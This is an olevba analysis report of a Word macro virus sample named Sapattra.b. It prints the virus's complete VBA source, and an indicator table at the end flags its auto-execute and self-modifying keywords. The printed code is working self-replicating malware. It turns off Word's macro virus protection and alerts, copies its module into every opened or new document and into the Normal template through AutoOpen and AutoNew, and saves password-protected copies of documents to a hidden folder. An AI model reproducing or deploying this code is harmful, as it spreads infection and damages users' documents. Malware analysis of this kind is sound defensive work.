olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sapattra.b-c98dc705142d5e2cd9de0770b9cee194a91ee53b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sapattra.b-c98dc705142d5e2cd9de0770b9cee194a91ee53b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sapattra.bas 
in file: Virus.MSWord.Sapattra.b-c98dc705142d5e2cd9de0770b9cee194a91ee53b - OLE stream: 'Macros/VBA/Sapattra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub removeA4()
    Dim signature, index, eol, cmt
    Dim sf As Boolean
    Dim dm
    
    
    On Error Resume Next
    
    signature = "ModuleA4"
    sf = False
    index = 0
    eol = 0
    
    
    If Application.Documents.Count < 1 Then
      Exit Sub
    End If
    
    ccount = Word.ActiveDocument.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.ActiveDocument.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              sf = True
              index = i%
           End If
        Next i%
    
    If sf Then
        eol = Word.ActiveDocument.VBProject.VBComponents.Item(index).CodeModule.CountOfLines
        Word.ActiveDocument.VBProject.VBComponents.Item(index).CodeModule.DeleteLines 1, eol
        sf = False
    End If
    
    ccount = Word.NormalTemplate.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.NormalTemplate.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              sf = True
              index = i%
           End If
        Next i%
    
    If sf Then
        eol = Word.NormalTemplate.VBProject.VBComponents.Item(index).CodeModule.CountOfLines
        Word.NormalTemplate.VBProject.VBComponents.Item(index).CodeModule.DeleteLines 1, eol
        sf = False
    End If
    

End Sub
Sub checkDIR()
    Dim MyFile, MyPath, MyName
       MyPath = "c:\msoffice"
    MyName = Dir(MyPath, vbDirectory)
    If MyName = "" Then
      MkDir "c:\msoffice"
    End If
    
End Sub

Sub doSAVE()
    Dim no_of_docs, file1
    Dim myDate, myTime
    
    On Error Resume Next
    
    no_of_docs = Application.Documents.Count
    
    
    
    
    If no_of_docs < 1 Then Exit Sub
    
    myDate = Date
    myTime = Time
    
    
    
    s1 = Trim(Format(myDate, "dd-mmm-yyyy"))
    s2 = Trim(Format(myTime, "hh-mm-ss AMPM"))
    
    file1 = s1 + "(" + s2 + ")"
    
    checkDIR
    
    path1 = "c:\msoffice\" + file1 + ".doc"
  
  
    ActiveDocument.SaveAs FileName:=path1, FileFormat:=wdFormatDocument, _
        LockComments:=False, Password:="sapattra", AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
    
  

    
     
End Sub


Function checkSIGN(location As Boolean)
    Dim mfile, ccount, index
    Dim signflag As Boolean
    Dim sigunature As String
     
      
      
    On Error Resume Next
    
    Application.DisplayAlerts = wdAlertsNone
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelInterrupt
    
    Options.VirusProtection = False
    
    mfile = "c:\win32dll.drv"
  
       
    signature = "Sapattra"
    signflag = False
    index = 0
    
    
    If Application.Documents.Count < 1 Then
      checkSIGN = index
      Exit Function
    End If
    
    If (location) Then
        ccount = Word.ActiveDocument.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.ActiveDocument.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              signflag = True
              index = i%
              Word.ActiveDocument.VBProject.VBComponents.Item(index).Export mfile
           End If
        Next i%
    Else
        ccount = Word.NormalTemplate.VBProject.VBComponents.Count
        For i% = 1 To ccount
           mm$ = Word.NormalTemplate.VBProject.VBComponents.Item(i%).Name
           If Trim(mm$) = signature Then
              signflag = True
              index = i%
              Word.NormalTemplate.VBProject.VBComponents.Item(index).Export mfile
           End If
        Next i%
    End If

  checkSIGN = index
  
err_lbl:
End Function


Sub doAttach()
    Dim ld, ln
    Dim mfile
    
    
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    
    removeA4
    
    ld = checkSIGN(True)
    ln = checkSIGN(False)
    
    mfile = "c:\win32dll.drv"
    
    If (ln And ld) Then
      'module is attached hence exit
      GoTo exit_label_2
    End If
    
    If (ld = 0) Then
     'module is not attached to active document the attach to it
      Word.ActiveDocument.VBProject.VBComponents.Import mfile
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    
    If (ln = 0) Then
     'module is not attached to active document the attach to it
     Word.NormalTemplate.VBProject.VBComponents.Import mfile
     NormalTemplate.Save
    End If
    
    

exit_label_2:
End Sub
Sub AutoNew()
 doAttach
End Sub
Sub AutoOpen()
    doAttach
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub doHIDE(n As Integer, action As Boolean)
 CommandBars(n).Enabled = action
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

